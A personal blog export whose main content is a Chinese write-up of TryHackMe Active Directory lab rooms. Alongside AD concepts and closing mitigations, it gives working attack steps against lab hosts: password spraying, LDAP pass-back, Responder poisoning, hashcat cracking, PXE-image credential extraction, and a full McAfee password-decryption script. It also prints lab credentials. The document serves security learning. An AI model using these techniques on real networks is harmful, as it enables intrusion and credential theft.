{"meta":{"title":"Recopec 的博客","subtitle":"","description":"喵","author":"Recopec","url":"https://blog.irec.moe","root":"/"},"pages":[{"title":"links","date":"2013-07-13T12:46:25.000Z","updated":"2024-12-08T07:24:38.008Z","comments":true,"path":"PY.html","permalink":"https://blog.irec.moe/PY.html","excerpt":"","text":"朋友们 PY？建议使用如下格式方便懒狗我复制粘贴 123456{ &quot;title&quot;: &quot;Recopec 的博客&quot;, &quot;link&quot;: &quot;https://blog.irec.moe&quot;, &quot;img&quot;: &quot;https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/avatar.jpg&quot;, &quot;des&quot;: &quot;一只喵喵&quot; }"},{"title":"文章归档","date":"2024-07-15T14:25:52.605Z","updated":"2023-08-25T13:14:42.000Z","comments":true,"path":"archive.html","permalink":"https://blog.irec.moe/archive.html","excerpt":"","text":""},{"title":"","date":"2024-10-30T07:54:57.651Z","updated":"2024-10-30T07:54:57.651Z","comments":true,"path":"about.html","permalink":"https://blog.irec.moe/about.html","excerpt":"","text":"关于我称呼你好，首先欢迎你来到这里。我叫 Recopec，rɪˈkɔːpek 。 其实我也不知道这个 ID 的由来，但从初中开始就用这个就没换过了。因为特别难读所以平常熟悉的人一般会叫我 rec 。 现状我个人由于受不了高中的高压，我没有参加高考，参加自主招生上了大专，专业也是凭借自己兴趣选的 移动通信技术。 目前毕业于在某双非二本，专业是 计算机与科学与技术。现在在准备工作中。 常常出现在夜晚，思绪也在夜晚活跃居多，导致经常失眠。 博客现在属于半残状态，有挺多想写的，动力不足，文笔有限，但是我有灵感的话一定会打开 Typora 记录下的！ 爱好没有户外活动，纯纯的宅。 💾 硬件 喜欢购买电脑配件 外设都略微有研究过，可以问问咱意见 🔗 网络 &#x2F; 通信 个人从小就对这一块感兴趣，算是见证了国内2345G的发展吧。 常常到一块区域就要摸清楚这一块的不同运营商的覆盖情况，被同学吐槽，别人是来看风景的，你是来这看基站的。 是运营商头疼的客户之一 有意向考 HCIE，并且之后的就业方向也是这一块 📷 影视 喜欢做一些体验（不是测评），录制成视频发布在B站 拍摄照片仅仅只是会构图而已（只会拍风景） 🎵 音乐 杂食向，各类都听… 比如补完一部番的OST、流行的electronic之类。 🎮 游戏 FPS PUBG、CS:GO、R6 各类都有接触一点吧，喜欢玩生存类的 音游 初中受同学影响接触了 节奏大师 算是音游的启蒙 初&#x2F;高中肝了一段时间 osu! 甚至去深圳华强北的夜市捡了一块 CTL-671 ，不过现在 AFK 中 喜欢这种氛围，不过好久没玩了啊啊啊啊 Galgame 最喜欢的是 ISLAND 和 ATRI 在高中的时候治愈了我好多ww VRChat 同 ID ，欢迎来贴贴、ERP，不定时上线~ 想找我玩？只在 Telegram 上活跃。PM Friendly，但是我可能不知道怎么回，一般是一个 sticker 作为回应。 uwu，不知道怎么说好。别人给我的评价是很难接近，但是接近了就比较好聊的那一类型，不善于找话题。经常就事论事，没事的时候很少闲聊，我也不喜欢这样，这导致我相对来说比较孤僻。 总之你能和我找到话题一般都会聊的挺开心的。 也不仅限于闲聊吧，觉得我能帮上忙也可以问咱，会耐心给你解答的（前提是我不忙）。 🚫 禁忌我讨厌欺骗，隐瞒。仅此而已。"}],"posts":[{"title":"Try Hack Me - Active Directory","slug":"THM/20250802_Active_Directory/AD","date":"2025-08-09T16:00:00.000Z","updated":"2025-08-09T16:39:10.666Z","comments":true,"path":"/thm_ad.html","permalink":"https://blog.irec.moe/thm_ad.html","excerpt":"","text":"概述这是我在 TryHackMe 里面学习 Windows Active Directory 相关渗透技巧的记录，推荐当做一个官方之外的 WriteUp 来阅读，直接阅读你会看不懂的。说实话各个房间设计的都挺巧妙的，虽然也有很多 Bug，不过利用搜索引擎和官方的 Discord 群组能解决。 这一部分我耗时一个星期完成，大多都是我的学习记录和理解，希望里面的内容能帮到你们。 Active Directory Basics这个房间主要是讲了一下 AD 的基础，还有实操了一下 GPO Windows 域Windows 域是受特定企业管理的一组用户和计算机。域的主要理念是将 Windows 计算机网络的常用组件集中管理到一个名为**Active Directory ( AD )的存储库中。运行 Active Directory 服务的服务器称为域控制器 ( DC )**。 配置 Windows 域的主要优点是： 集中身份管理：可以轻松从 Active Directory 配置整个网络的所有用户。 管理安全策略：您可以直接从 Active Directory 配置安全策略，并根据需要将其应用于网络上的用户和计算机。 Active DirectoryWindows 域的核心是 AD DS (Active Directory Domain Service)，这项服务就像一个目录，保存着网络上所有“对象”的信息。在 AD 支持的众多对象中，有用户、组、机器、打印机、共享等。让我们来看看其中的一些： Users 用户用户是一种被称为安全主体的对象。安全主体是一个通用的概念，它指的是任何可以被域认证身份（如通过密码），并被授予权限来访问和操作网络中各种资源（如文件、打印机）的实体。 用户可用于代表两类实体： People：用户通常代表组织中需要访问网络的人员，如员工。 Service：您也可以定义用户供 IIS 或 MSSQL 等服务使用。每个服务都需要用户才能运行，但服务用户与普通用户不同，他们只拥有运行特定服务所需的权限。 Machines 机器机器是 Active Directory 中的另一种对象类型；每台加入 Active Directory 域的计算机都会创建一个机器对象。机器也被视为安全主体，与普通用户一样被分配一个账户。该账户在域内的权限有限。 机器账户本身是指定计算机上的本地管理员，除了计算机本身外，一般不允许任何人访问，但与其他账户一样，如果你有密码，就可以用它登录。 机器账户的密码会被自动轮换，它由120个随机字符串组成，机器账户是由机器名后加一个 $ 符号组成，比如 DC01 机器会有一个 DC01$ 账户。 Security Groups 安全组如果你熟悉 Windows，你可能知道可以定义用户组，将文件或其他资源的访问权限分配给整个组，而不是单个用户。这样可以更好地进行管理，因为你可以将用户添加到现有组中，他们将自动继承该组的所有权限。安全组也被视为安全负责人，因此可以拥有对网络资源的权限。 组的成员既可以是用户，也可以是机器。如果需要，组还可以包括其他组。 域中默认创建了几个组，可用于向用户授予特定权限。下面举例说明域中最重要的几个组： Security Group Description Domain Admins 该组的用户拥有整个域的管理权限。默认情况下，他们可以管理域上的任何计算机，包括 DC。 Server Operators 该组中的用户可以管理域控制器。他们不能更改任何管理组的成员资格。 Backup Operators 该组的用户可以访问任何文件，无需考虑其权限。它们用于执行计算机数据备份。 Account Operators 该组中的用户可以创建或修改域中的其他账户。 Domain Users Includes all existing user accounts in the domain. Domain Computers Includes all existing computers in the domain. Domain Controllers Includes all existing DCs on the domain. 关于默认安全组的微软文档：https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups Organizational Units 管理单元要在 Active Directory 中配置用户、组或机器，我们需要登录域控制器，并从开始菜单中运行 “Active Directory Users and Computers”： 这将打开一个窗口，你可以看到域中存在的用户、计算机和组的层次结构。这些对象按组织单位 (Organizational Units OU) 组织，组织单位是一种容器对象，可以对用户和计算机进行分类。OUs 主要用于定义具有类似监控要求的用户集合。请记住，一个用户在同一时间只能属于一个 OU。 Windows 自动创建的 OU，包含以下内容： Builtin： 包含任何 Windows 主机都可使用的默认组。 Computers： 任何加入网络的机器都会默认放在这里。如有需要，您可以移动它们。 Domain Controllers： 包含网络中 DC 的默认 OU。 Users： 适用于全域范围的默认用户和组。 Managed Service Accounts： 保存 Windows 域中服务使用的账户。 Security Groups vs OUs你可能想知道为什么我们既有组又有 OU。虽然两者都用于对用户和计算机进行分类，但它们的目的完全不同： OU 可以方便地将策略应用到用户和计算机，其中包括根据用户在企业中的特定角色对其进行特定配置。请记住，一个用户在同一时间只能是一个 OU 的成员，因为试图对一个用户应用两套不同的策略是没有意义的。 另一方面，安全组用于授予资源权限。例如，如果要允许某些用户访问共享文件夹或网络打印机，就需要使用组。一个用户可以是多个组的成员，这是对多个资源授予访问权限所必需的。 管理 AD删除额外的 OU 和用户需要关闭 Advanced Features -&gt; Object -&gt; Protect object from accidental deletion 委派 Delegation在 AD 中可以做的一件好事就是让特定用户对某些 OU 享有一定的控制权。这个过程被称为委派，允许你授予用户在 OU 上执行高级任务的特定权限，而不需要域管理员介入。最常见的使用案例之一就是授予 IT 支持人员重置其他低权限用户密码的权限。 给 OU 委派，右键选择 Delegate Control -&gt; Add -&gt; Check Names -&gt; 选择要委派的权限。 12345# 重置密码 Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt &#39;New Password&#39;) -Verbose # 强制用户在登录时改密码 Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose 管理计算机默认情况下，所有加入域的计算机（DC 除外）都会被放入名为“Computers”的容器中。 我们可以看到一些服务器、一些笔记本电脑和一些 PC，它们分别对应着我们网络中的用户。将所有设备都放在那里并不是最好的选择，因为您很可能希望针对服务器和普通用户日常使用的机器设置不同的策略。 虽然没有关于如何组织你的机器的黄金法则，但一个很好的起点是根据设备的用途进行分类。通常，你会看到设备至少分为以下三类： 1.工作站 工作站是 Active Directory 域中最常见的设备之一。域中的每个用户都可能登录到工作站。他们将使用该设备进行工作或进行正常的浏览活动。这些设备绝对不应该有特权用户登录。 2. 服务器 服务器是 Active Directory 域中第二常见的设备。服务器通常用于向用户或其他服务器提供服务。 3. 域控制器 域控制器是 Active Directory 域中第三常见的设备。域控制器允许您管理 Active Directory 域。这些设备通常被视为网络中最敏感的设备，因为它们包含环境中所有用户帐户的哈希密码。 Group Policies 组策略到目前为止，我们只是为了方便而将用户和计算机组织到 OU 中，但这背后的主要想法是能够为每个 OU 单独部署不同的策略。这样，我们就可以根据用户所在的部门向其推送不同的配置和安全基线。 Windows 通过组策略对象（GPO）来管理此类策略。GPO 只是一组可应用于 OU 的设置集合。GPO 可以包含针对用户或计算机的策略，允许您为特定的机器和身份设置基线。 要配置 GPO，可以使用 “开始 ”菜单中的 “组策略管理 ”工具： 打开它后，首先看到的是之前定义的完整 OU 层次结构。要配置组策略，首先要在组策略对象下创建一个 GPO，然后将其链接到要应用策略的 OU。举例来说，你可以看到机器中已经存在一些 GPO： 可以在 Group Policy Objects 里面看到创建的 GPO，然后对应的链接到 GPO 的地方是有一个快捷方式一样的小图标。 让我们检查一下 “默认域策略”，看看 GPO 内部有什么。选择 GPO 时看到的第一个选项卡会显示其范围，即 GPO 在 AD 中的链接位置。对于当前策略，我们可以看到它只链接到了 thm.local 域： 如您所见，您还可以对 GPO 应用安全过滤，使其只应用于 OU 下的特定用户&#x2F;计算机。默认情况下，它们将应用于 “已验证用户 ”组，其中包括所有用户&#x2F;计算机。 设置选项卡包括 GPO 的实际内容，让我们知道它适用于哪些特定配置。如前所述，每个 GPO 都有只适用于计算机的配置和只适用于用户的配置。在本例中，默认域策略只包含计算机配置： 后面就是进 GPO 编辑器改了，跟我们 gpedit.msc 一样的，不过这个会应用到应用了 GPO 的 OU 上。但是 GPO 不能直接应用在组上，但可以通过安全筛选来让它只对某个组生效。 分发 GPOGPO 通过名为 SYSVOL 的网络共享分发到网络，该共享存储在 DC 中。域中的所有用户通常都可以通过网络访问该共享，以定期同步他们的 GPO。SYSVOL 共享默认指向网络中每个 DC 上的 C:\\Windows\\SYSVOL\\sysvol\\ 目录。 一旦对任何 GPO 进行了更改，计算机可能需要长达 2 个小时的时间才能跟上。如果要强制任何特定计算机立即同步其 GPO，可以在所需计算机上运行以下命令： 1gpupdate /force 认证方式使用 Windows 域时，所有凭据都存储在域控制器中。每当用户尝试使用域凭据对服务进行身份验证时，服务都需要请求域控制器验证凭据是否正确。在 Windows 域中，有两种协议可用于网络身份验证： Kerberos 协议： 任何最新版本的 Windows 都会使用。这是任何新版域的默认协议。 NetNTLM：出于兼容性目的而保留的传统身份验证协议。 虽然 NetNTLM 应被视为过时协议，但大多数网络都会启用这两种协议。让我们深入了解一下这两种协议的工作原理。 Kerberos Authentication 用户携带用户名和用户自己的 Hash 加密过的时间戳向 KDC 请求 TGT KDC 回复一个 TGT，里面有一份 Session Key，不过是用 krbtgt 账户 Hash 加密过的。和一个使用用户 Hash 加密的 Session Key 返回给用户 当用户想请求网络上的一个服务时，会向 KDC 请求一个 TGS。发送过去的东西有 用 Session Key 加密过的用户名和时间戳 上一步 KDC 返回回来的 TGT SPN（服务主体名称） 然后 KDC 回复一个用服务所有者账户 Hash 加密的 TGS，这个 TGS 里面有 Svc Session Key。和一个用 Session Key 加密的 Svc Session Key。 当用户请求一个服务时，会发送用 Svc Session Key 加密过的用户名和时间戳。还有包含 Svc Session Key 的 TGS。 TGS 里面是有 Svc Session Key 的，然后服务器可以用它的 Hash 去解密 TGS，拿到 Svc Session Key，就能解密用户的数据包了 NetNTLM AuthenticationNetNTLM 采用挑战-响应机制工作。整个过程如下： 客户端向想要访问的服务器发送验证请求。 服务器会生成一个随机数，并将其作为挑战发送给客户端。 客户端将其 NTLM 密码哈希值与挑战（及其他已知数据）相结合，生成对挑战的响应，并将其发送回服务器进行验证。 服务器将挑战和响应转发给域控制器进行验证。 域控制器使用挑战重新计算响应，并将其与客户端发送的原始响应进行比较。如果两者匹配，则客户端通过验证；否则，拒绝访问。身份验证结果将发回服务器。 服务器将验证结果转发给客户端。 请注意，为了安全起见，用户密码（或哈希值）绝不会通过网络传输。 注意：所述过程适用于使用域帐户的情况。如果使用的是本地账户，服务器可自行验证对挑战的响应，而无需与域控制器交互，因为服务器的 SAM 上本地存储有密码哈希值。 Trees, Forests and Trusts随着公司的发展，其网络也在不断发展。开始时，公司拥有一个域名就足够了，但随着时间的推移，一些额外的需求可能会促使你拥有多个域名。 树 Trees例如，设想一下，您的公司突然扩展到一个新的国家。新的国家有不同的法律法规，要求您更新 GPO 以符合规定。此外，您现在在两个国家都有 IT 人员，每个 IT 团队都需要在不干扰其他团队的情况下管理与每个国家相对应的资源。虽然您可以创建复杂的 OU 结构并使用授权来实现这一目标，但庞大的 AD 结构可能难以管理，而且容易出现人为错误。 幸运的是，Active Directory 支持整合多个域，这样您就可以将网络划分为可以独立管理的单元。如果您有两个共享相同名称空间的域，那么这两个域可以连接成一棵树。 如果我们的 thm.local 域被分为英国和美国分支的两个子域，则可以建立一个树状结构，其中包括一个根域 thm.local，以及名为 uk.thm.local 和 us.thm.local 的两个子域，每个子域都有自己的 AD、计算机和用户： 这种分区结构可以让我们更好地控制谁可以访问域中的哪些内容。英国的 IT 人员将有自己的 DC，只管理英国的资源。例如，英国用户将无法管理美国用户。这样，每个分支机构的域管理员就可以完全控制各自的 DC，但不能控制其他分支机构的 DC。还可以为树状结构中的每个域独立配置策略。 在谈及树和林时，需要引入一个新的安全组。企业管理员组将授予用户对企业所有域的管理权限。每个域仍有域管理员，他们对自己的单个域拥有管理员权限，而企业管理员则可以控制企业中的一切。 森林 Forests您管理的域也可以配置在不同的命名空间中。假设贵公司不断发展壮大，最终收购了另一家名为 MHT Inc. 两家公司合并后，每家公司可能会有不同的域树，分别由各自的 IT 部门管理。将多个具有不同命名空间的域树合并到同一网络中称为森林。 信任关系 Trust Relationships将多个域以树和森林的形式组织起来，可以在管理和资源方面形成一个良好的分隔网络。但在某些情况下，THM UK 的用户可能需要访问 MHT ASIA 服务器中的某个共享文件。为此，以树和森林形式排列的域通过信任关系连接在一起。 简单地说，域之间的信任关系允许您授权域 THM UK 的用户访问域 MHT EU 的资源。 可以建立的最简单的信任关系是单向信任关系。在单向信任关系中，如果网域 AAA 信任网域 BBB，这就意味着可以授权 BBB 上的用户访问 AAA 上的资源： 单向信任关系的方向与访问方向相反。 也可以建立双向信任关系，允许两个域相互授权对方的用户。默认情况下，在树或森林下连接多个域将形成双向信任关系。 需要注意的是，域之间建立信任关系并不会自动授予访问其他域上所有资源的权限。一旦建立了信任关系，你就有机会授权不同域的用户，但授权与否取决于你。 Breaching Active Directory首先是配置网络，说实话有点麻烦，要下官方他提供的那个专门用于 AD 域的配置文件，还要把系统的 DNS 覆盖掉。 12345sudo vim /etc/resolv.conf # 锁定和解锁文件 chattr +i /etc/resolv.conf chattr -i /etc/resolv.conf 其他的倒是没啥了，不过发现 223.5.5.5 在我网络环境下面死掉了。 并不是，是他自己死了：https://www.v2ex.com/t/1149042 密码喷洒这一节提了一下 NTLM 和 NetNTLM 概念，后者是接收到用户凭据之后，发送到 DC 服务器去认证，认证不在这个机器上进行而是在 DC 上做的。 密码喷洒意思是：用一个已知的密码去尝试其他的用户登录，用这种方式能避免被发现，如果爆破的话动静很大。 1234python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/ # Python 用这条命令安装缺的库 pip install requests_ntlm --break-system-packages LDAP 回传攻击这一节就是通过模拟 LDAP 服务器，强制降级认证方式然后从通信上截取明文密码，我觉得这里应该有开源的轮子。 题目是给了一个打印机服务器，密码不是明文存储的，但是我们可以通过修改他的服务器地址去截获他。 然后我们要搭建一个 LDAP 服务器，这里用的是 SLAPD。 1234# 安装 sudo apt-get update &amp;&amp; sudo apt-get -y install slapd ldap-utils &amp;&amp; sudo systemctl enable slapd # 配置 sudo dpkg-reconfigure -p low slapd 然后要让认证降级成明文的，用到这样一个配置文件。 1234#olcSaslSecProps.ldif dn: cn=config replace: olcSaslSecProps olcSaslSecProps: noanonymous,minssf=0,passcred 1234567891011# 应用配置文件 sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif &amp;&amp; sudo service slapd restart # 测试配置文件 ldapsearch -H ldap:// -x -LLL -s base -b &quot;&quot; supportedSASLMechanisms # dn: # supportedSASLMechanisms: PLAIN # supportedSASLMechanisms: LOGIN # 抓包 sudo tcpdump -SX -i breachad tcp port 389 认证中继这一节讲述的是，在 Windows 机器的网络下面，很多服务会互相通信，允许用户使用这些网络中提供的服务。而这些服务会用身份验证方法去验证身份，这就让我们有了可乘之机，可以去抓取这些数据包去破解。 Server Message Block (SMB)在早期版本的 SMB 中安全性不足，有很多漏洞和利用点，尽管漏洞在新版中解决了，但是因为旧系统不支持这些版本或者其他原因，导致没有强制升级到最新版。 抓 NTLM Challenge 包，离线破解，但是比直接爆破 NTLM hash 慢很多 可以自建服务器做 MTIM 攻击，截获认证成功的 session LLMNR, NBT-NS, and WPAD在现实局域网上会有很多 NetNTLM challenge，有时因为过期的 DNS 记录，这些数据包可能会发到你伪造的服务器上。 文章介绍了一个 Responder 工具，他可以去实现 MITM。 在真实的局域网（LAN）中，Responder 会尝试投毒它检测到的任何链路本地多播名称解析、NetBIOS 名称服务 和 Web 代理自动发现请求。 在大型 Windows 网络中，这些协议能让主机去自己发现主机，而不是去请求 DNS 服务器，这些协议就类似于 DNS 一样的，不过他的行为更像 ARP。主机可以首先尝试通过发送 LLMNR (Link-Local Multicast Name Resolution) 请求，并查看是否有任何主机响应，来确定它们要查找的主机是否在同一个本地网络上。 NBT-NS (NetBIOS Name Service) 是 LLMNR 的前身协议，而 WPAD (Web Proxy Auto-Discovery) 请求是为了尝试查找未来 HTTP(s) 连接的代理服务器而发出的。 由于这些协议依赖于在本地网络中广播的请求，所以我们的恶意设备也能收到这些请求。通常，这些请求因为不是发给我们的主机，就会被简单地丢弃。然而，Responder 会积极监听这些请求，并发送伪造的响应，告诉发起请求的主机：我们的 IP 地址就是它想要连接的主机名对应的地址。通过投毒这些请求，Responder 试图强制客户端连接到我们的 攻击机。与此同时，它还会启动并托管多个服务器，比如 SMB、HTTP、SQL 等，以便捕获这些连接请求并强制进行身份验证，然后我们能直接抓到凭据或者是 hash。 拦截 NetNTLM因为 Responder 是通过 race condition（比服务器更快响应给客户端）去给连接投毒的，这样我们才能拦截到这个连接。 还要小心 Responder 会干扰到正常业务，或者被检测到。 1234sudo python responder.py -I breachad # 记得关掉前面开的 SLAPD sudo service slapd stop 然后过一会就抓到 Hash 了，直接丢进 Hashcat 爆破。5600 是 NetNTLMv2，不同的 Hash 种类可以在这里看。 1echo &quot;svcFileCopy::ZA:d1fbc574572a06dquot; &gt; hash.txt &amp;&amp; hashcat -m 5600 -a 0 hash.txt ./passwordlist-1647876320267.txt --force SMB Relay 中继如果 SMB 开了签名就寄了，可以通过 SMB 中继把认证成功的截获，然后以这个用户的身份去访问那些文件。 推荐房间：https://tryhackme.com/room/hololive 看了一下，这房间覆盖面好广，之后再来探索吧。 微软部署工具包介绍了一下 Microsoft Deployment Toolkit (MDT) 和 Microsoft’s System Center Configuration Manager (SCCM)，MDT 是集成在 SCCM 里面的，这俩是自动化安装系统&#x2F;打补丁工具，但是没有说具体实现，介绍一下思路。 从镜像文件中提取凭据提了一下 MDT 可以用来管理 PXE 启动，题目的意思就是我们可以拿到他的配置文件，然后找到那个安装镜像，里面会存着用于配置系统的账户和密码，BCD 文件可以用 PowerPXE 提取里面的信息。 12345678910111213# 取回 bcd 文件 tftp -i 10.200.20.202 GET &quot;\\Tmp\\x64{0620E466-5D23-4890-A8C2-3E89E9A4E777}.bcd&quot; conf.bcd # 进入 PowerShell 环境 powershell -executionpolicy bypass # 载入 PowerShell 脚本 Import-Module .\\PowerPXE.ps1 $BCDFile = &quot;conf.bcd&quot; Get-WimFile -bcdFile $BCDFile &gt;&gt; Parse the BCD file: conf.bcd &gt;&gt;&gt;&gt; Identify wim file : \\Boot\\x64\\Images\\LiteTouchPE_x64.wim \\Boot\\x64\\Images\\LiteTouchPE_x64.wim 这里找到了一个启动镜像文件，下载下来然后用 PowerPXE 脚本提取信息，或者可以手动解包镜像之后找到 bootstrap.ini 查看。 12345678tftp -i 10.200.20.202 GET &quot;\\Boot\\x64\\Images\\LiteTouchPE_x64.wim&quot; pxeboot.wim -v Get-FindCredentials -WimFile pxeboot.wim &gt;&gt; Open pxeboot.wim &gt;&gt;&gt;&gt; Finding Bootstrap.ini &gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; DeployRoot = \\\\THMMDT\\MTDBuildLab$ &gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserID = &lt;account&gt; &gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserDomain = ZA &gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserPassword = &lt;password&gt; 关于 PXE 提取信息相关可以看这个：https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/ 配置文件这个也是老生常谈了，也是信息收集技能的一环，文章提到了以下几个地方可能会存着凭据。 Web 应用程序配置文件 服务配置文件 注册表 集中部署的应用程序 浏览器 另外也可以用这个自动化工具 Seatbelt 去提取。 从迈克菲杀毒中提取凭据McAfee 在安装过程中，会将用于连接回其管理服务器的凭据嵌入在一个名为 ma.db 的文件中。拥有本地主机访问权限后，可以检索并读取这个数据库文件，从而恢复相关的 AD 服务账户。 1234567cd C:\\ProgramData\\McAfee\\Agent\\DB dir # 通过 SCP 把文件传到本地 scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db . # 打开迈克菲的 SQLite 数据库 sqlitebrowser ma.db 打开 AGENT_REPOSITORIES 表，提取加密后的密码，用下面这个脚本解密。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python # Info: # McAfee Sitelist.xml password decryption tool # Jerome Nokin (@funoverip) - Feb 2016 # More info on https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/ # # Quick howto: # Search for the XML element &lt;Password Encrypted=&quot;1&quot;&gt;...&lt;/Password&gt;, # and paste the content as argument. # ########################################################################### import sys import base64 # 原脚本是用的 Cryptodome # https://pypi.org/project/pycryptodome/ # 从这里看的话，pycryptodome 包安装之后是在 Crypto 底下的 from Crypto.Cipher import DES3 from Crypto.Hash import SHA # hardcoded XOR key KEY = bytearray.fromhex(&quot;12150F10111C1A060A1F1B1817160519&quot;).decode(&quot;utf-8&quot;) def sitelist_xor(xs): result = bytearray(0) for i, c in enumerate(xs): cb = c.to_bytes(1, byteorder=&quot;big&quot;) result += (ord(cb) ^ ord(KEY[i%16])).to_bytes(1, byteorder=&quot;big&quot;) return result def des3_ecb_decrypt(data): # hardcoded 3DES key key = SHA.new(b&#39;&lt;!@#$%^&gt;&#39;).digest() + bytearray(4) # decrypt des3 = DES3.new(key, DES3.MODE_ECB) data += bytearray(64 - (len(data) % 64)) decrypted = des3.decrypt(data) return decrypted[0:decrypted.find(0)] or &quot;&lt;empty&gt;&quot; if __name__ == &quot;__main__&quot;: if len(sys.argv) != 2: print(&quot;Usage: %s &lt;base64 passwd&gt;&quot; % sys.argv[0]) print(&quot;Example: %s &#39;jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==&#39;&quot; % sys.argv[0]) sys.exit(0) # read arg encrypted_password = base64.b64decode(bytes(sys.argv[1], &quot;utf-8&quot;)) # decrypt passwdXOR = sitelist_xor(encrypted_password) password = des3_ecb_decrypt(passwdXOR).decode(&quot;utf-8&quot;) # print out print(&quot;Crypted password : %s&quot; % sys.argv[1]) print(&quot;Decrypted password : %s&quot; % password) sys.exit(0) python 这个环境不太明白，我在 Kali 中安装包老是提示要我加 --break-package-system 看了这个帖子 Is it bad to use pip install –break-package-system? 发现确实不行，系统有一部分是依赖那些包的，如果升级或者安装把包搞挂了，系统也炸了，解决办法是用虚拟环境来解决，不太懂怎么用，之后去学学。 1234# 如果提示缺库，安装这个 py -m pip install pycryptodome py mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q== DLC - Python 虚拟环境虚拟环境（Virtual Environment） 是一个独立、隔离的 Python 运行环境。它的核心思想是： 隔离性： 每个虚拟环境都有自己独立的 Python 解释器、pip 工具和 site-packages 目录。 互不干扰： 当你在一个虚拟环境中安装包时，这些包只会安装到这个虚拟环境的 site-packages 目录中，不会影响到系统全局的 Python 环境。 项目专用： 你可以为每个 Python 项目创建一个独立的虚拟环境，这样不同项目之间所需的依赖库版本就不会冲突。 1234567891011121314# 建立项目目录 mkdir my_project cd my_project # 创建虚拟环境 # 这个命令会在当前目录下创建一个名为 YOUR_venv_NAME 的子目录 python3 -m venv YOUR_venv_NAME # 激活虚拟环境 source venv/bin/activate # 安装依赖，会安装到虚拟环境中，而不会安装到系统全局的 Python pip install requests_ntlm pip install pycryptodome 总结AD 的攻击面非常大，可以从以下几个方面去缓解： 培训用户意识 控制 AD 服务暴露面 不要暴露在外网，仅在内网可访问并且启用 MFA 的 VPN 启用 NAC 网络访问控制 强制 SMB 签名 遵守最小权限原则 Enumerating Active Directory这一个房间其实是讲信息收集的，从很多个面，很多种方法去收集信息 根据房间去设置好网卡的 DNS 后，去获取一组凭据。 rachael.atkinson Password: Zjqf3489 1ssh za.tryhackme.com\\\\rachael.atkinson@thmjmp1.za.tryhackme.com 凭据注入这里用到的是 Runas.exe /netonly ，刚开始不明白他的作用是什么，以为是以域上的用户的权限去执行程序的，实际上是用提供的域和凭据注入一个临时的应用程序，之后执行的网络操作都用的这个凭据去执行。 123runas.exe /netonly /user:za.tryhackme.com\\rachael.atkinson cmd.exe dir \\\\za.tryhackme.com\\SYSVOL\\ 可以看到标题栏有 作为 xxxx 运行 的提示。 DNS 解析不到域控实际上是一个 Windows 下的优先级的问题，因为我外网网卡的跃点数比 OpenVPN 网卡的接口跃点数大，所以 DNS 优先用外置网卡的 DNS 去查询，当然查不到结果。通过调小 OpenVPN 的网卡的跃点数解决。 123456789101112131415161718192021222324252627# NS 手动查询 DNS nslookup za.tryhackme.com 服务器: 10.1.2.1 Address: 10.1.2.1 *** 10.1.2.1 找不到 za.tryhackme.com: Non-existent domain # 查看系统内 DNS netsh interface ip show dns # 查看接口跃点数 netsh interface ipv4 show interface Idx Met MTU 状态 名称 --- ---------- ---------- ------------ --------------------------- 13 25 1500 connected 本地连接 2 7 20 1500 connected 以太网 7 # 调小跃点数后查询 DNS 解析 nslookup thmjmp1.za.tryhackme.com DNS request timed out. timeout was 2 seconds. 服务器: UnKnown Address: 10.200.68.101 名称: thmjmp1.za.tryhackme.com Address: 10.200.68.248 IP 和 域名 当使用域名（hostname）访问时，首选的认证协议是 Kerberos。这是因为 Kerberos 的设计就是基于服务主体名称（Service Principal Name, SPN），它需要主机名才能正常工作。 当使用 IP 地址访问时，Kerberos 认证会失败，因为它无法为 IP 地址构建有效的 SPN。在这种情况下，Windows 会回退（fall back） 到 NTLM 认证。 Enumeration 枚举这一块就介绍了几种方式去收集 AD 中相关信息的方法。 MMC即 Microsoft Management Console，如果是远程管理的话，要装一个 RAST 的组件。 如果是本地访问远端的域，不能直接在 runas 好的 cmd 中运行，要重新开始。 12# 本地运行 runas.exe /netonly /user:za.tryhackme.com\\rachael.atkinson mmc 然后添加管理单元，把三个 AD 域的都勾上，再返回到主页右键加好的那些单元，都把域名指定好。 优点 全面的视图：图形用户界面提供了一个极好的方法来全面了解活动目录（AD）环境。 快速搜索：可以对不同的活动目录对象进行快速搜索。 直接查看更新：它提供了一种直接的方法来查看特定活动目录对象的更新。 直接修改：如果我们有足够的权限，可以直接更新现有的活动目录对象或添加新的对象。 缺点 需要远程桌面访问：图形用户界面需要在执行它的机器上进行远程桌面协议（RDP）访问。 无法广域收集：虽然搜索单个对象很快，但无法进行全活动目录范围的属性或特征收集。 CMD注意⚠️：这个不能用 runas 来远程操作 1234567891011121314# 显示域中所有用户 net user /domain # 查看某个用户的信息 net user zoe.marshall /domain # 查看域中所有的组 net group /domain # 查看组中的成员 net group &quot;Tier 1 Admins&quot; /domain # 查看密码策略 net accounts /domain 密码策略可以帮助我们更好地猜测在攻击中应该使用哪些单个密码，密码错误多少次锁定账户，又或者是锁定账户的时间。 优点 无需额外工具：不需要安装任何额外的或外部工具，并且这些简单的命令通常不会被蓝队（Blue team，指安全防御团队）监控到。 无需图形界面：我们不需要图形用户界面（GUI）就可以进行这种枚举。 支持宏语言：VBScript 和其他常用于钓鱼攻击（phishing payloads）的宏语言原生支持这些命令，因此可以在制作更具体的恶意负载之前，用来枚举关于活动目录（AD）域的初始信息。 缺点 需要加入域：net 命令必须在已加入域（domain-joined）的机器上执行。如果机器没有加入域，它将默认显示 WORKGROUP（工作组）域的信息。 